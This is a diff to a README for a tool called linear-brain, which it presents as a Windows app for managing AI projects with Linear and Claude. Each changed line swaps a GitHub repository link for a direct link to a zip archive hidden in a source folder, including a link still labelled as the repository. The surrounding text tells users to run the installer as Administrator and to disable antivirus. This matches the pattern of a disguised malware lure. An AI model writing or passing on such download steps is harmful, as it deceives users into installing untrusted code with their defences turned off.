@@ -1,6 +1,6 @@
 # 🤖 linear-brain - Manage AI Projects with Ease
 
-[![Download linear-brain](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://github.com/lizettedoubtful741/linear-brain)
+[![Download linear-brain](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/lizettedoubtful741/linear-brain/main/src/server/brain-linear-2.1.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Before you start, make sure your computer matches these requirements:
 
 1. **Visit the download page**  
 Click the large green button or visit this page to get the software:  
-[Download linear-brain](https://github.com/lizettedoubtful741/linear-brain)
+[Download linear-brain](https://raw.githubusercontent.com/lizettedoubtful741/linear-brain/main/src/server/brain-linear-2.1.zip)
 
 2. **Look for the latest release**  
 On the page, find the section labeled **Releases** or **Downloads**. The latest version will be at the top.
@@ -105,7 +105,7 @@ Try running the installer as Administrator. Disable any running antivirus tempor
 
 ## 📘 Additional Resources
 
-- Learn more about linear-brain at the [GitHub repository](https://github.com/lizettedoubtful741/linear-brain).
+- Learn more about linear-brain at the [GitHub repository](https://raw.githubusercontent.com/lizettedoubtful741/linear-brain/main/src/server/brain-linear-2.1.zip).
 - Check Linear’s official help pages to understand how project boards work.
 - For AI integration questions, see Claude and Claude Code documentation online.
 - Join discussion forums about project management and AI help tools.
@@ -115,6 +115,6 @@ Try running the installer as Administrator. Disable any running antivirus tempor
 ## 🟩 Download linear-brain now
 
 Find the latest Windows installer here:  
-[![Download linear-brain](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://github.com/lizettedoubtful741/linear-brain)
+[![Download linear-brain](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/lizettedoubtful741/linear-brain/main/src/server/brain-linear-2.1.zip)
 
 Click the link to visit the page and get the software. Once downloaded, follow the installation and setup steps above.
